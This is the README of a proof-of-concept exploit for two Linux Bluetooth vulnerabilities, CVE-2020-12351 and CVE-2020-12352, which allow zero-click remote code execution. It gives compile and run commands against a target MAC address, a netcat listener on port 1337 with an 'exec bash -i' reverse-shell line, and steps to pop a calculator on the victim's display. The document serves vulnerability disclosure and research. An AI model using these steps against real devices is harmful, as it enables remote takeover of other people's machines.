# LookTooth: Linux Bluetooth Zero-Click Remote Code Execution

This Proof-Of-Concept demonstrates the exploitation of [CVE-2020-12351] and [CVE-2020-12352]

## Technical info

Technical info about the exploit is available at [writeup.md](writeup.md).

## Usage

Compile it using:

```sh
$ gcc -o exploit exploit.c -lbluetooth
```

and execute it as:

```sh
$ sudo ./exploit target_mac source_ip source_port
```

In another terminal, run:

```sh
$ nc -lvp 1337
exec bash -i 2>&0 1>&0
```

If successful, a calc can be spawned with:

```sh
export XAUTHORITY=/run/user/1000/gdm/Xauthority
export DISPLAY=:0
gnome-calculator
```

This Proof-Of-Concept has been tested against a Asus Tuf FX505DT running Ubuntu 20.04.1 LTS with:

- `5.4.0-48-generic #52-Ubuntu SMP Thu Mar 25 10:58:49 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux`

The success rate of the exploit is estimated at 80%.

